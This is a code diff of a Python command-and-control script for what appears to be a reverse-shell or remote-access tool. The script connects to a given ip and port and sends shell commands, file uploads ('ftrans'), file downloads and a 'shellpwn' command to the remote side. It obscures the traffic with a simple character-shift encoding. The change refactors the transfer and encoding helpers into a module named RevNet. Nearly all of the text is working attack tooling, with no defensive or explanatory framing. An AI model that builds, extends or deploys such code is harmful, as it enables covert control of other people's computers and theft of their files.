@@ -3,85 +3,17 @@ import socket
 import sys
 import time
 import _thread
-import tcpall
+import RevNet
 
 def nop():
 
 	return 0
-
-def ftrans(sck,fname):
-
-	fhandle=open(fname,'rb')
-
-	data=fhandle.read()
-
-	data_len=len(data)
-
-	print("Sending "+str(data_len)+" bytes of data.")
-
-	sck.send(str.encode(str(data_len)))
-
-	print(sck.recv(1024))
-
-	sck.send(str.encode(fname))
-
-	print(sck.recv(1024))
-
-	time.sleep(5)
-
-	sck.sendall(data)
-
-	print("Data sent.")
-
-	print(sck.recv(1024))
-
-	fhandle.close()
 
 if(len(sys.argv)!=3):
 
 	print("Usage "+sys.argv[0]+" <ip> <port>")
 
 	exit()
-
-def dec(txt):
-
-	i=0
-
-	newbuf=''
-
-	char=''
-
-	dec=0
-
-	for i in range(len(txt)):
-
-		dec=ord(txt[i])
-
-		char=chr(dec-4)
-
-		newbuf+=char
-
-	return newbuf
-
-def enc(txt):
-
-	i=0
-
-	newbuf=''
-
-	char=''
-
-	dec=0
-
-	for i in range(len(txt)):
-
-		dec=ord(txt[i])
-
-		char=chr(dec+4)
-
-		newbuf+=char
-
-	return newbuf
 
 def smake():
 
@@ -152,7 +84,7 @@ def passcmd():
 
         if cmd=='quit':
 
-            tcpall.send_all(c,str.encode(enc(cmd)))
+            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
 
             c.close()
 
@@ -162,31 +94,31 @@ def passcmd():
 
         elif cmd[:6]=="ftrans":
 
-            tcpall.send_all(c,str.encode(enc("ftrans")))
+            RevNet.send_all(c,str.encode(RevNet.enc("ftrans")))
 
-            ftrans(c,cmd[7:])
+            RevNet.ftrans(c,cmd[7:])
 
         elif cmd[:8]=="download":
 
             fname=input("File Name:")
 
-            tcpall.send_all(c,str.encode(enc(cmd)))
+            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
 
-            tcpall.send_all(c,str.encode(enc(fname)))
+            RevNet.send_all(c,str.encode(RevNet.enc(fname)))
 
-            print(tcpall.recv_all(c).decode())
+            print(RevNet.recv_all(c).decode())
 
         elif cmd[:8]=="shellpwn":
 
-            tcpall.send_all(c,str.encode(enc(cmd)))
+            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
 
-            print(dec(tcpall.recv_all(c).decode()))
+            print(RevNet.dec(RevNet.recv_all(c).decode()))
 
         elif len(str.encode(cmd))>0:
 
-            tcpall.send_all(c,str.encode(enc(cmd)))
+            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
 
-            crecv=dec(str(tcpall.recv_all(c).decode("utf-8")))
+            crecv=RevNet.dec(str(RevNet.recv_all(c).decode("utf-8")))
 
             print(crecv, end="")
 
